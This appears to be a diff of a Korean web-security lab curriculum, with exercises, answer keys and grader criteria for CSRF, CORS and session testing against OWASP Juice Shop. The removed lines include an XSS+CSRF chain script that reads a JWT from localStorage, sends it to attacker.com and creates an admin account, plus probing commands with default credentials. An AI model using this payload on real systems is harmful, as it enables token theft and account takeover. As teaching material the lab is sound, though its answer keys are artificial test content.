-    [도구 권장] Burp Repeater 로 토큰 필드 제거/조작 / OWASP ZAP active scan / python
-    requests 로 토큰 변형 시도. 호출 후 stdout 1~3줄 quote.
-  hint: |
-    최소 3가지 결함 + 각 우회 방법 + 방어 패턴. Juice Shop 은 토큰 자체 미사용 (JWT) 이지만
-    Cookie 기반 legacy 시스템 가정으로 카탈로그 작성.
-  category: csrf_bypass
-  points: 12
-  answer: |
-    🤖 프롬프트: CSRF 토큰 검증 로직의 흔한 구현 결함 6 가지를 카탈로그 형태로 정리하고,
-    각각의 우회 PoC + 올바른 방어 패턴 매트릭스를 출력해줘.
-
-    📎 참고 (CLI):
-      cat <<'REPORT'
-      === CSRF 토큰 검증 약점 카탈로그 ===
-      1. 토큰 미검증              | 우회: token=anything       | 방어: HMAC-SHA256 비교
-      2. 빈 토큰 허용             | 우회: token=               | 방어: 빈 문자열/null reject
-      3. GET 메서드 예외          | 우회: GET 으로 변경 API 호출 | 방어: GET = safe 원칙
-      4. 전역 토큰 (세션 무관)    | 우회: 다른 사용자 토큰 재사용 | 방어: session bound
-      5. 약한 entropy (rand/time) | 우회: 토큰 예측             | 방어: CSPRNG 32 byte
-      6. Referer fallback         | 우회: Referer 도 위조       | 방어: 다층 검증 + 토큰 필수
-      === CSRF 토큰 분석 완료 ===
-      REPORT
-  answer_detail: |
-    핵심: CSRF 토큰은 "서버가 발급 + 클라이언트 echo + 서버 비교" 3 단계 모두 정확해야 효과.
-    구현 결함은 어느 단계든 실패하면 우회 가능. 가장 흔한 결함은 #1 (검증 코드 자체가 없음 —
-    개발자가 "토큰만 발급하면 끝" 으로 오해) + #4 (전역 토큰 — Synchronizer Token 미적용).
-    방어: HMAC-SHA256 + session-bound + CSPRNG + 만료 시간 + GET-safe 원칙 동시 적용.
-  verify:
-    type: output_contains
-    expect: CSRF 토큰 분석 완료
-    field: stdout
-    semantic:
-      intent: CSRF 토큰 검증 약점 — 토큰 비교 누락, 빈 토큰 허용, GET 메서드 예외, 전역 토큰 재사용 등 결함
-      success_criteria:
-      - 최소 3가지 구현 결함 열거(비교 누락, 빈 문자열 허용, 세션 무관 토큰)
-      - Burp Repeater 로 토큰 삭제/수정 후 요청 시도
-      - 방어 (HMAC 기반 토큰, 세션 바인딩) 언급
-      acceptable_methods:
-      - Burp Repeater 로 토큰 필드 제거/조작
-      - python requests 로 토큰 변형 (빈/타사용자/timestamp) 테스트
-      - OWASP CSRF Prevention Cheat Sheet 참조
-      - OWASP ZAP CSRF active scan
-      negative_signs:
-      - 약점 1가지만
-      - 실제 테스트 없이 개념만
-      - 방어 방안 없음
-  target_vm: attacker
-  script: |
-    cat <<'REPORT'
-    === CSRF 토큰 검증 약점 카탈로그 ===
-    1. 토큰 미검증              | 우회: token=anything       | 방어: HMAC-SHA256 비교
-    2. 빈 토큰 허용             | 우회: token=               | 방어: 빈 문자열/null reject
-    3. GET 메서드 예외          | 우회: GET 으로 변경 API 호출 | 방어: GET = safe 원칙
-    4. 전역 토큰 (세션 무관)    | 우회: 다른 사용자 토큰 재사용 | 방어: session bound
-    5. 약한 entropy (rand/time) | 우회: 토큰 예측             | 방어: CSPRNG 32 byte
-    6. Referer fallback         | 우회: Referer 도 위조       | 방어: 다층 검증 + 토큰 필수
-    === CSRF 토큰 분석 완료 ===
-    REPORT
-  risk_level: low
-  bastion_prompt: |
-    CSRF 토큰 검증 로직의 흔한 구현 결함 6 가지 카탈로그 출력:
-
-      cat <<'REPORT'
-      === CSRF 토큰 검증 약점 카탈로그 ===
-      1. 토큰 미검증              | 우회: token=anything       | 방어: HMAC-SHA256 비교
-      2. 빈 토큰 허용             | 우회: token=               | 방어: 빈 문자열/null reject
-      3. GET 메서드 예외          | 우회: GET 으로 변경 API 호출 | 방어: GET = safe 원칙
-      4. 전역 토큰 (세션 무관)    | 우회: 다른 사용자 토큰 재사용 | 방어: session bound
-      5. 약한 entropy (rand/time) | 우회: 토큰 예측             | 방어: CSPRNG 32 byte
-      6. Referer fallback         | 우회: Referer 도 위조       | 방어: 다층 검증 + 토큰 필수
-      === CSRF 토큰 분석 완료 ===
-      REPORT
-
-    출력 quote + 가장 흔한 결함 (#1, #4) 강조 + 다층 방어 (HMAC + session + CSPRNG + GET-safe)
-    한 문장.
-- order: 7
-  instruction: |
-    [목표] 서버가 Referer 헤더 검증으로 CSRF 를 방어할 때 가능한 우회 기법 4 가지를 분석
-    하고, Juice Shop 의 Referer/Origin 처리 실측한다.
-
-    [Referer 우회 기법]
-      1. **meta referrer=no-referrer** : HTML 페이지가 Referer 송신 자체를 차단
-      2. **HTTPS → HTTP 다운그레이드** : 브라우저는 보안상 Referer 미전송
-      3. **data: URL / blob: URL** : Referer 없음
-      4. **subdomain takeover** : *.victim.com 점유 후 그곳에서 요청 → Referer 가 같은 도메인
-
-    [실측 : Juice Shop 의 Referer/Origin 영향]
-      echo '=== 정상 Origin ==='
-      curl -sI -H 'Origin: http://juice.6v6.lab' http://juice.6v6.lab/api/Users \
-        | grep -iE 'HTTP|access-control'
-      echo '=== 악성 Origin ==='
-      curl -sI -H 'Origin: http://evil.com' http://juice.6v6.lab/api/Users \
-        | grep -iE 'HTTP|access-control'
-      echo '=== Referer 없음 ==='
-      curl -sI -e '' http://juice.6v6.lab/api/Users | grep -iE 'HTTP|access-control'
-      echo 'Referer 우회 기법 완료'
-
-    [도구 권장] curl -e (Referer) / -H 'Origin:' / Burp / Mozilla MDN Referrer-Policy 문서.
-    호출 후 stdout 1~3줄 quote.
-  hint: |
-    4가지 우회 기법 모두 나열 + Juice Shop 실측 결과 (정상/악성/없음 Origin 의 응답 차이)
-    quote. Referer-only 방어의 근본 한계 (헤더는 client-side controlled) 설명.
-  category: csrf_bypass
-  points: 10
-  answer: |
-    🤖 프롬프트: Referer 기반 CSRF 방어 우회 4 가지 (meta no-referrer / HTTPS→HTTP / data URL
-    / subdomain takeover) 분석하고, Juice Shop 에서 Origin/Referer 변형 시 응답 차이를
-    실측해줘.
-
-    📎 참고 (CLI):
-      echo '=== 정상 Origin ==='
-      curl -sI -H 'Origin: http://juice.6v6.lab' http://juice.6v6.lab/api/Users \
-        | grep -iE 'HTTP|access-control'
-      echo '=== 악성 Origin ==='
-      curl -sI -H 'Origin: http://evil.com' http://juice.6v6.lab/api/Users \
-        | grep -iE 'HTTP|access-control'
-      echo '=== Referer 없음 ==='
-      curl -sI -e '' http://juice.6v6.lab/api/Users | grep -iE 'HTTP|access-control'
-      echo 'Referer 우회 기법 완료'
-  answer_detail: |
-    Referer 검증의 근본 한계: (1) 클라이언트가 송신 여부 제어 가능 (meta/Policy/링크 속성)
-    (2) Referer 미존재 시 거부할지 통과할지 정책 모호 (3) 다운그레이드/data URL/subdomain
-    로 우회 다수. 따라서 Referer 검증은 *defense in depth* 의 부가적 layer 일 뿐, 단독 방어
-    는 위험. 권장: Origin 헤더 검증 (Referer 보다 신뢰성 높음 — 브라우저가 항상 송신, 변형
-    어려움) + CSRF 토큰.
-  verify:
-    type: output_contains
-    expect:
-    - Referer 우회 기법 완료
-    - curl
-    field: stdout
-    semantic:
-      intent: |
-        Juice Shop 의 Origin/Referer 영향 실측 + Referer 우회 4 기법 + Origin 헤더가 더
-        신뢰성 높은 이유 분석.
-      success_criteria:
-      - 3 케이스 (정상 Origin / 악성 Origin / Referer 없음) curl 실측 + 응답 quote
-      - 우회 기법 4가지 (meta/HTTPS↓HTTP/data URL/subdomain takeover) 나열
-      - Referer 단독 방어의 한계 (client-controlled, 미존재 정책 모호) 설명
-      - 대안: Origin 헤더 검증 + CSRF 토큰 다층 방어 권고
-      acceptable_methods:
-      - curl -H 'Origin:' / -e (Referer)
-      - Burp Repeater 로 헤더 조작
-      - meta referrer=no-referrer / Referrer-Policy 적용
-      - rel=noreferrer 링크 속성
-      negative_signs:
-      - 우회 기법 1-2개만 (4개 미만)
-      - 실측 없이 개념만
-      - Origin vs Referer 비교 누락
-  target_vm: attacker
-  script: |
-    echo '=== 정상 Origin ==='
-    curl -sI -H 'Origin: http://juice.6v6.lab' http://juice.6v6.lab/api/Users \
-      | grep -iE 'HTTP|access-control'
-    echo '=== 악성 Origin ==='
-    curl -sI -H 'Origin: http://evil.com' http://juice.6v6.lab/api/Users \
-      | grep -iE 'HTTP|access-control'
-    echo '=== Referer 없음 ==='
-    curl -sI -e '' http://juice.6v6.lab/api/Users | grep -iE 'HTTP|access-control'
-    echo 'Referer 우회 기법 완료'
-  risk_level: low
-  bastion_prompt: |
-    Juice Shop 의 Origin/Referer 변형 실측 + Referer 우회 4 기법 분석:
-
-      echo '=== 정상 Origin ==='
-      curl -sI -H 'Origin: http://juice.6v6.lab' http://juice.6v6.lab/api/Users \
-        | grep -iE 'HTTP|access-control'
-      echo '=== 악성 Origin ==='
-      curl -sI -H 'Origin: http://evil.com' http://juice.6v6.lab/api/Users \
-        | grep -iE 'HTTP|access-control'
-      echo '=== Referer 없음 ==='
-      curl -sI -e '' http://juice.6v6.lab/api/Users | grep -iE 'HTTP|access-control'
-      echo 'Referer 우회 기법 완료'
-
-    출력 quote + 우회 기법 4가지 (meta/HTTPS↓HTTP/data URL/subdomain takeover) + Referer
-    단독 방어의 근본 한계 + Origin 헤더가 더 신뢰성 높은 이유.
-- order: 8
-  instruction: |
-    [목표] JSON 엔드포인트의 CSRF 가능성을 simple-request vs preflight 의 관점에서 분석하고,
-    Content-Type 우회 시도가 Juice Shop 에서 어떻게 응답하는지 실측한다.
-
-    [핵심 개념]
-      - **simple request** (CORS 스펙) : 메서드 GET/HEAD/POST + Content-Type 이 application/
-        x-www-form-urlencoded / multipart/form-data / text/plain 중 하나 → preflight 없음
-      - **preflight 요청** : 그 외 (예: application/json, Authorization 등 custom 헤더)
-        → OPTIONS 사전 요청 → 서버가 Allow-Origin/Allow-Methods 응답해야 본 요청 허용
-
-    [공격면]
-      - 서버가 Content-Type 검증 안 하면 attacker 가 Content-Type: text/plain 으로 JSON
-        body 보내 simple request 로 우회 (preflight 회피)
-      - 서버가 JSON parser 가 text/plain 도 받으면 위조 성공
-
-    [실측]
-      echo '=== text/plain 으로 JSON body 시도 ==='
-      curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
-        -H 'Content-Type: text/plain' \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | head -20
-      echo '---'
-      echo '=== application/json 정상 ==='
-      curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
-        -H 'Content-Type: application/json' \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | head -5
-      echo 'JSON CSRF 분석 완료'
-
-    [도구 권장] curl + 다양 Content-Type / Burp Repeater + Macro / OWASP CORS Misconfig
-    가이드. 호출 후 stdout 1~3줄 quote.
-  hint: |
-    text/plain 으로 JSON 보냈을 때 응답 status / body 비교. Content-Type 검증 있으면 400
-    (parse error). 없으면 200 (CSRF 가능). Juice Shop 의 실제 응답 quote 필수.
-  category: csrf_advanced
-  points: 10
-  answer: |
-    🤖 프롬프트: Juice Shop /rest/user/login 에 Content-Type: text/plain 으로 JSON body
-    보내 simple-request 우회 가능 여부 확인하고, application/json 정상 응답과 비교해줘.
-
-    📎 참고 (CLI):
-      echo '=== text/plain 으로 JSON body 시도 ==='
-      curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
-        -H 'Content-Type: text/plain' \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | head -20
-      echo '---'
-      echo '=== application/json 정상 ==='
-      curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
-        -H 'Content-Type: application/json' \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | head -5
-      echo 'JSON CSRF 분석 완료'
-  answer_detail: |
-    JSON CSRF 면역의 *통념* (브라우저가 preflight 보내니 차단) 은 서버가 Content-Type 을
-    엄격 검증할 때만 성립. 검증 없으면 text/plain 으로 simple request 되어 우회. 권장:
-    (1) Content-Type 가 application/json 인지 서버 측 검증 (2) CSRF 토큰 동시 적용 (3)
-    Express body-parser strict / Spring @RequestBody type=application/json 강제.
-  verify:
-    type: output_contains
-    expect: JSON CSRF 분석 완료
-    field: stdout
-    semantic:
-      intent: |
-        Juice Shop login 의 Content-Type text/plain vs application/json 응답 비교 + simple
-        vs preflight 개념 + JSON 면역 통념의 한계 분석.
-      success_criteria:
-      - text/plain + JSON body 시도 실측 + 응답 status quote
-      - application/json 정상 응답과 비교
-      - simple request vs preflight CORS 스펙 차이 설명
-      - Content-Type 검증 없으면 JSON 면역 깨지는 이유 명시
-      acceptable_methods:
-      - curl -H 'Content-Type:' 다양 변형
-      - Burp Repeater + Macro
-      - fetch 의 Content-Type 조작
-      - Flash XHR (구형) 또는 form trickery
-      negative_signs:
-      - simple vs preflight 구분 없음
-      - JSON 만으로 CSRF 완전 차단된다고 오판
-      - 서버 측 Content-Type 검증 권고 누락
-  target_vm: attacker
-  script: |
-    echo '=== text/plain 으로 JSON body 시도 ==='
-    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
-      -H 'Content-Type: text/plain' \
-      -d '{"email":"admin@juice-sh.op","password":"admin123"}' | head -20
-    echo '---'
-    echo '=== application/json 정상 ==='
-    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
-      -H 'Content-Type: application/json' \
-      -d '{"email":"admin@juice-sh.op","password":"admin123"}' | head -5
-    echo 'JSON CSRF 분석 완료'
-  risk_level: low
-  bastion_prompt: |
-    Juice Shop login 의 Content-Type 검증 강도 실측:
-
-      echo '=== text/plain 으로 JSON body 시도 ==='
-      curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
-        -H 'Content-Type: text/plain' \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | head -20
-      echo '---'
-      echo '=== application/json 정상 ==='
-      curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
-        -H 'Content-Type: application/json' \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | head -5
-      echo 'JSON CSRF 분석 완료'
-
-    출력 quote + simple vs preflight 차이 + Content-Type 검증의 CSRF 면역에 대한 역할.
-- order: 9
-  instruction: |
-    [목표] Juice Shop 의 CORS 헤더를 실측하고 CSRF 와의 관계를 분석한다. (CC 실측 결과:
-    `Access-Control-Allow-Origin: *` 와일드카드 발견.)
-
-    [CORS 와 CSRF 의 4 케이스]
-      1. **ACAO 명시 origin + ACAC=true** : 해당 origin 만 credentials 동반 요청 허용 (안전)
-      2. **ACAO=* + ACAC 없음** : simple GET 응답을 cross-origin JS 가 읽을 수 있음 (정보 누출)
-      3. **ACAO=* + ACAC=true** : 브라우저가 강제 차단 (CORS 스펙 위반)
-      4. **ACAO=reflect (Origin echo) + ACAC=true** : 모든 origin 허용 → 가장 위험 (CSRF 가능)
-
-    [실측 — Juice Shop CORS]
-      echo '=== Origin: evil ==='
-      curl -sI -H 'Origin: http://evil.com' http://juice.6v6.lab \
-        | grep -iE 'HTTP|access-control'
-      echo '---'
-      echo '=== Origin: legit ==='
-      curl -sI -H 'Origin: http://juice.6v6.lab' http://juice.6v6.lab \
-        | grep -iE 'HTTP|access-control'
-      echo '---'
-      echo '=== OPTIONS preflight ==='
-      curl -sI -X OPTIONS \
-        -H 'Origin: http://evil.com' \
-        -H 'Access-Control-Request-Method: POST' \
-        -H 'Access-Control-Request-Headers: content-type,authorization' \
-        http://juice.6v6.lab/api/Users \
-        | grep -iE 'HTTP|access-control'
-      echo 'CORS 분석 완료'
-
-    [예상 결과] `Access-Control-Allow-Origin: *` 발견 — wildcard. Allow-Credentials 헤더
-    부재 → 케이스 #2 (정보 노출 위험, 단 credentials 동반 CSRF 는 차단). OPTIONS preflight
-    응답: `204 No Content + ACAO: * + ACAM: GET,HEAD,PUT,PATCH,POST,DELETE + ACAH: content-
-    type,authorization` — 매우 관대한 정책. Juice Shop = 의도된 교육용 취약 설정으로,
-    Authorization 헤더 까지 preflight 허용 → JWT 가 cross-origin JS 에서도 전송 가능 (단
-    JWT 자체는 localStorage 의 Same-Origin Policy 로 보호).
-
-    [도구 권장] curl -H 'Origin:' / corsy 자동 스캐너 / Burp CORS scanner / Mozilla CORS docs.
-    호출 후 stdout 1~3줄 quote.
-  hint: |
-    4 케이스 매트릭스 + Juice Shop 실측 결과 (`*` 와일드카드 발견) 분석 + ACAC 부재로 simple
-    GET 응답 노출 위험 + reflect 형 (가장 위험) 패턴 별도 설명.
-  category: csrf_advanced
-  points: 10
-  answer: |
-    🤖 프롬프트: Juice Shop 의 CORS 헤더 (ACAO/ACAC) 실측하고 4 케이스 (명시/와일드카드/와일드카드
-    +credentials/reflect) 매트릭스로 CSRF 관계 분석해줘.
-
-    📎 참고 (CLI):
-      echo '=== Origin: evil ==='
-      curl -sI -H 'Origin: http://evil.com' http://juice.6v6.lab \
-        | grep -iE 'HTTP|access-control'
-      echo '---'
-      echo '=== Origin: legit ==='
-      curl -sI -H 'Origin: http://juice.6v6.lab' http://juice.6v6.lab \
-        | grep -iE 'HTTP|access-control'
-      echo '---'
-      echo '=== OPTIONS preflight ==='
-      curl -sI -X OPTIONS \
-        -H 'Origin: http://evil.com' \
-        -H 'Access-Control-Request-Method: POST' \
-        -H 'Access-Control-Request-Headers: content-type,authorization' \
-        http://juice.6v6.lab/api/Users \
-        | grep -iE 'HTTP|access-control'
-      echo 'CORS 분석 완료'
-  answer_detail: |
-    Juice Shop 실측 = ACAO `*` (wildcard) + ACAC 부재. 의미: simple GET 응답이 cross-origin
-    JS 에 노출 가능 (정보 누출), 단 credentials 동반 요청은 브라우저가 거부 (#3 케이스 차단).
-    가장 위험한 패턴은 reflect (Origin 헤더 그대로 echo) + ACAC=true — 모든 origin 이
-    credentials 동반으로 cross-origin 요청 가능 → 완전 CSRF. 권고: ACAO 화이트리스트 명시
-    + ACAC 는 필요한 endpoint 에만.
+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 패스워드 정책 검증을(를) 수행해줘\n\U0001F4CE 참고 (CLI):\
+    \ curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 정책 검증 완료'"
+  answer_detail: 패스워드 정책 검증은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect:
     - 완료
-    - Access
-    - Control
+    - web_scan
+    - 10.20.32.80
     field: stdout
     semantic:
-      intent: |
-        Juice Shop CORS 헤더 실측 (ACAO/ACAC) + 4 케이스 (명시/wildcard/wildcard+cred/
-        reflect) 매트릭스 + Juice Shop = wildcard 발견 분석.
+      intent: 패스워드 정책 검증 — 짧은/공용/약한 패스워드 허용 여부, haveibeenpwned API 등 유출 이력 체크
       success_criteria:
-      - 3 케이스 (evil Origin / legit Origin / OPTIONS preflight) 실측 + 응답 quote
-      - ACAO 와 ACAC 의 4 케이스 매트릭스 정리
-      - ACAO `*` + ACAC=true 가 브라우저에 의해 차단되는 스펙 원칙 명시
-      - reflect 형 (Origin echo + ACAC) 가 가장 위험한 패턴 강조
-      - Juice Shop 실측 결과 (wildcard / ACAC 부재) 의 의미 해석
+      - 최소 3가지 약한 패스워드(1234/password/admin) 시도
+      - 정책(최소 길이·복잡도·유출 차단) 미비점 식별
+      - NIST SP 800-63B 권고 언급
       acceptable_methods:
-      - curl -H 'Origin:' 다양 변형 + OPTIONS preflight 모방
-      - corsy 자동 스캐너 / Burp CORS scanner
-      - Mozilla CORS docs
+      - API 회원가입/변경으로 테스트 비밀번호 시도
+      - haveibeenpwned API 조회
+      - zxcvbn 복잡도 추정
+      - OWASP ASVS v4 V2 참조
       negative_signs:
-      - CORS 만 언급하고 CSRF 연결 없음
-      - 4 케이스 매트릭스 누락
-      - reflect 형 위험 누락
+      - 단일 패스워드만 테스트
+      - 유출 이력 체크 없음
+      - 표준 기준 없이 주관 평가
   target_vm: attacker
-  script: |
-    echo '=== Origin: evil ==='
-    curl -sI -H 'Origin: http://evil.com' http://juice.6v6.lab \
-      | grep -iE 'HTTP|access-control'
-    echo '---'
-    echo '=== Origin: legit ==='
-    curl -sI -H 'Origin: http://juice.6v6.lab' http://juice.6v6.lab \
-      | grep -iE 'HTTP|access-control'
-    echo '---'
-    echo '=== OPTIONS preflight ==='
-    curl -sI -X OPTIONS \
-      -H 'Origin: http://evil.com' \
-      -H 'Access-Control-Request-Method: POST' \
-      -H 'Access-Control-Request-Headers: content-type,authorization' \
-      http://juice.6v6.lab/api/Users \
-      | grep -iE 'HTTP|access-control'
-    echo 'CORS 분석 완료'
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 정책\
+    \ 검증 완료'"
   risk_level: low
-  bastion_prompt: |
-    Juice Shop CORS 헤더 실측 + 4 케이스 매트릭스:
+  bastion_prompt: '10.20.32.80 대상으로 패스워드 정책 검증을(를) 수행해줘
 
-      echo '=== Origin: evil ==='
-      curl -sI -H 'Origin: http://evil.com' http://juice.6v6.lab \
-        | grep -iE 'HTTP|access-control'
-      echo '---'
-      echo '=== Origin: legit ==='
-      curl -sI -H 'Origin: http://juice.6v6.lab' http://juice.6v6.lab \
-        | grep -iE 'HTTP|access-control'
-      echo '---'
-      echo '=== OPTIONS preflight ==='
-      curl -sI -X OPTIONS \
-        -H 'Origin: http://evil.com' \
-        -H 'Access-Control-Request-Method: POST' \
-        -H 'Access-Control-Request-Headers: content-type,authorization' \
-        http://juice.6v6.lab/api/Users \
-        | grep -iE 'HTTP|access-control'
-      echo 'CORS 분석 완료'
 
-    출력 quote + ACAO `*` 발견 시 ACAC 부재 의미 + 4 케이스 (명시/wildcard/wildcard+cred/
-    reflect) 비교 + 권고.
-- order: 10
-  instruction: |
-    [목표] XSS + CSRF 체인 공격을 설계한다. XSS 가 있으면 Same-Origin Policy 안에서 실행
-    되므로 CSRF 토큰 / SameSite / Origin 검증 *모든 방어가 무력화* 됨을 학습한다.
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 4
+  instruction: '{{WEB_IP}} 대상으로 세션 토큰 엔트로피 분석을(를) 수행하시오.
 
-    [공격 흐름]
-      1. **XSS 진입점** : W03 에서 발견한 reflected/stored XSS 로 피해자 브라우저에 JS 주입
-      2. **토큰 조회** : `document.querySelector('input[name="csrf_token"]').value` 또는
-         `document.cookie` (HttpOnly 아니면) 또는 localStorage (JWT) 읽기
-      3. **악성 요청 전송** : 탈취한 토큰을 헤더에 포함한 fetch() — Same-Origin 이므로
-         credentials 자동 첨부 + 모든 방어 통과
-      4. **결과 회수** : 응답을 attacker 서버로 exfiltrate (fetch + Image beacon)
 
-    [PoC (Juice Shop 의 JWT-localStorage 시나리오)]
-      cat > /tmp/xss_csrf_chain.js <<'JS'
-      // Stored XSS payload (W03-S13 의 review storage 활용)
-      const jwt = localStorage.getItem('token');                // 1) 토큰 탈취
-      fetch('http://attacker.com/log?t=' + jwt);                // 2) 외부 전송
-      fetch('/api/Users', {                                     // 3) 악성 요청
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': 'Bearer ' + jwt
-        },
-        body: JSON.stringify({email:'evil@a.com', password:'p', role:'admin'})
-      });
-      JS
-      cat /tmp/xss_csrf_chain.js
-      echo '체인 공격 설계 완료'
-
-    [방어 한계의 본질]
-      - CSRF 토큰: XSS 가 같은 origin → DOM 에서 토큰 읽기 가능 → 무력화
-      - SameSite Strict: 같은 origin 요청은 SameSite 와 무관 → 무력화
-      - Origin 검증: 같은 origin 이라 Origin 헤더 정상 → 통과
-      - 결론: XSS 가 존재하면 CSRF 방어 의 거의 모든 것이 무력화 → **XSS 차단이 곧 CSRF 방어
-        의 전제** — CSP, HttpOnly cookie 가 보조적 layer
-
-    [도구 권장] BeEF / XSSHunter / 직접 PoC 작성. 호출 후 stdout 1~3줄 quote.
-  hint: |
-    XSS 가 있으면 CSRF 토큰/SameSite/Origin 검증 모두 무력화. Same-Origin Policy 안에서
-    실행되기 때문. 따라서 XSS 차단 = CSRF 방어의 전제. CSP + HttpOnly cookie 가 보조 layer.
-  category: csrf_advanced
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
+    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 세션 토큰 엔트로피 분석 관련 도구와 기법을 활용하세요.
+  category: session
   points: 10
-  answer: |
-    🤖 프롬프트: XSS + CSRF 체인 공격 시나리오 (Juice Shop 의 JWT-localStorage 환경) 를
-    /tmp/xss_csrf_chain.js 로 작성하고, 왜 XSS 가 CSRF 방어를 모두 무력화하는지 분석해줘.
-
-    📎 참고 (CLI):
-      cat > /tmp/xss_csrf_chain.js <<'JS'
-      const jwt = localStorage.getItem('token');
-      fetch('http://attacker.com/log?t=' + jwt);
-      fetch('/api/Users', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': 'Bearer ' + jwt
-        },
-        body: JSON.stringify({email:'evil@a.com', password:'p', role:'admin'})
-      });
-      JS
-      cat /tmp/xss_csrf_chain.js
-      echo '체인 공격 설계 완료'
-  answer_detail: |
-    XSS 는 같은 origin 에서 JS 실행 → DOM 의 모든 것 (토큰, cookie, localStorage) 접근 가능
-    + 그 origin 의 cookie 자동 첨부 + 그 origin 의 Origin 헤더 송신. CSRF 방어 체계는 *외부
-    origin 의 공격* 을 가정하므로 같은 origin XSS 앞에서는 모두 무력. 결론: XSS 가 존재하면
-    CSRF 방어는 의미 없음 → XSS 차단이 우선 (CSP, output encoding, HttpOnly cookie).
+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 세션 토큰 엔트로피 분석을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 토큰 엔트로피\
+    \ 분석 완료'"
+  answer_detail: 세션 토큰 엔트로피 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
-    expect: 체인 공격 설계 완료
+    expect: 완료
     field: stdout
     semantic:
-      intent: |
-        XSS + CSRF 체인 PoC (Juice Shop JWT-localStorage) + Same-Origin 안에서 모든 CSRF
-        방어 (토큰/SameSite/Origin) 무력화 분석.
+      intent: 세션 토큰 엔트로피 분석 — 여러 토큰 수집 후 길이·charset·변이 관찰, Burp Sequencer 로 랜덤성 검증
       success_criteria:
-      - /tmp/xss_csrf_chain.js 작성 + cat 출력 quote
-      - localStorage.getItem('token') 또는 document.querySelector 로 토큰 조회
-      - 탈취 토큰 포함한 fetch (Authorization 헤더) 로 악성 요청
-      - XSS = Same-Origin 이라 모든 방어 무력화 사실 명시
-      - 따라서 XSS 차단이 CSRF 방어의 전제 (CSP, output encoding 강조)
+      - 최소 5개 세션 토큰 수집
+      - 길이·charset(hex/base64) 일관성 확인
+      - 추측 가능성(증가형 vs 랜덤) 판정
       acceptable_methods:
-      - document.querySelector / localStorage.getItem
-      - fetch with Authorization header
-      - BeEF 모듈 exploit chain
-      - XSSHunter + custom payload
+      - repeat curl -c cookies.txt login 으로 토큰 여러 개 생성
+      - Burp Sequencer 자동 랜덤성 분석
+      - python으로 엔트로피 계산 (math.log2 * len)
+      - dieharder/ent 통계 테스트
       negative_signs:
-      - XSS 없이 CSRF 만
-      - Same-Origin Policy 와 CSRF 방어 의 관계 분석 누락
-      - XSS 차단 의 우선성 결론 없음
+      - 단일 토큰만 관찰
+      - 랜덤성 평가 없음
+      - 예측 가능성 판정 없음
   target_vm: attacker
-  script: |
-    cat > /tmp/xss_csrf_chain.js <<'JS'
-    const jwt = localStorage.getItem('token');
-    fetch('http://attacker.com/log?t=' + jwt);
-    fetch('/api/Users', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + jwt
-      },
-      body: JSON.stringify({email:'evil@a.com', password:'p', role:'admin'})
-    });
-    JS
-    cat /tmp/xss_csrf_chain.js
-    echo '체인 공격 설계 완료'
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 토큰 엔트로피\
+    \ 분석 완료'"
   risk_level: low
-  bastion_prompt: |
-    XSS + CSRF 체인 PoC JS 를 /tmp/xss_csrf_chain.js 로 작성. Juice Shop JWT-localStorage
-    환경 가정. 다음 heredoc 실행 후 cat 출력 quote + XSS 가 CSRF 방어 (토큰/SameSite/Origin)
-    를 모두 무력화하는 이유 한 문장.
+  bastion_prompt: '10.20.32.80 대상으로 세션 토큰 엔트로피 분석을(를) 수행해줘
 
-      cat > /tmp/xss_csrf_chain.js <<'JS'
-      const jwt = localStorage.getItem('token');
-      fetch('http://attacker.com/log?t=' + jwt);
-      fetch('/api/Users', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': 'Bearer ' + jwt
-        },
-        body: JSON.stringify({email:'evil@a.com', password:'p', role:'admin'})
-      });
-      JS
-      cat /tmp/xss_csrf_chain.js
-      echo '체인 공격 설계 완료'
-- order: 11
-  instruction: |
-    [목표] Double Submit Cookie 방어의 원리를 Synchronizer Token Pattern 과 비교하고,
-    Stateless / Stateful trade-off 와 known weakness 를 분석한다.
 
-    [원리]
-      1. 서버가 랜덤 토큰을 응답에 *Cookie* 와 *body/header* 두 곳에 동시 송신
